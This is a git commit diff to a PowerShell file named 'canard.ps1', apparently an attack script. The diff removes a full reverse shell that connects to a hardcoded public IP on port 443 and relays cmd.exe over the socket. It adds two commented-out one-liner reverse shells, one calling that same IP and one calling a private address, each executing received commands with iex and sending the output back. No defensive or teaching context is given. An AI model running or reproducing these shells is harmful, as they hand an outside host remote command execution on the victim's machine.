11f94ab217ef3c999bb420c4a386edb350d020af
Jerome THEMEE <jthemee@gmail.com>
2017-06-17 16:58:26 +0200

    more
    and more

--- canard.ps1
+++ canard.ps1
@@ -1,43 +1,5 @@
-function cleanup {
-if ($client.Connected -eq $true) {$client.Close()}
-if ($process.ExitCode -ne $null) {$process.Close()}
-exit}
-// Setup IPADDR
-$address = '13.126.41.248'
-// Setup PORT
-$port = '443'
-$client = New-Object system.net.sockets.tcpclient
-$client.connect($address,$port)
-$stream = $client.GetStream()
-$networkbuffer = New-Object System.Byte[] $client.ReceiveBufferSize
-$process = New-Object System.Diagnostics.Process
-$process.StartInfo.FileName = 'C:\\windows\\system32\\cmd.exe'
-$process.StartInfo.RedirectStandardInput = 1
-$process.StartInfo.RedirectStandardOutput = 1
-$process.StartInfo.UseShellExecute = 0
-$process.Start()
-$inputstream = $process.StandardInput
-$outputstream = $process.StandardOutput
-Start-Sleep 1
-$encoding = new-object System.Text.AsciiEncoding
-while($outputstream.Peek() -ne -1){$out += $encoding.GetString($outputstream.Read())}
-$stream.Write($encoding.GetBytes($out),0,$out.Length)
-$out = $null; $done = $false; $testing = 0;
-while (-not $done) {
-if ($client.Connected -ne $true) {cleanup}
-$pos = 0; $i = 1
-while (($i -gt 0) -and ($pos -lt $networkbuffer.Length)) {
-$read = $stream.Read($networkbuffer,$pos,$networkbuffer.Length - $pos)
-$pos+=$read; if ($pos -and ($networkbuffer[0..$($pos-1)] -contains 10)) {break}}
-if ($pos -gt 0) {
-$string = $encoding.GetString($networkbuffer,0,$pos)
-$inputstream.write($string)
-start-sleep 1
-if ($process.ExitCode -ne $null) {cleanup}
-else {
-$out = $encoding.GetString($outputstream.Read())
-while($outputstream.Peek() -ne -1){
-$out += $encoding.GetString($outputstream.Read()); if ($out -eq $string) {$out = ''}}
-$stream.Write($encoding.GetBytes($out),0,$out.length)
-$out = $null
-$string = $null}} else {cleanup}}
+#A simple and small reverse shell. Options and help removed to save space. 
+#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
+#$client = New-Object System.Net.Sockets.TCPClient("13.126.41.248",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
+#$sm=(New-Object Net.Sockets.TCPClient("192.168.254.1",55555)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
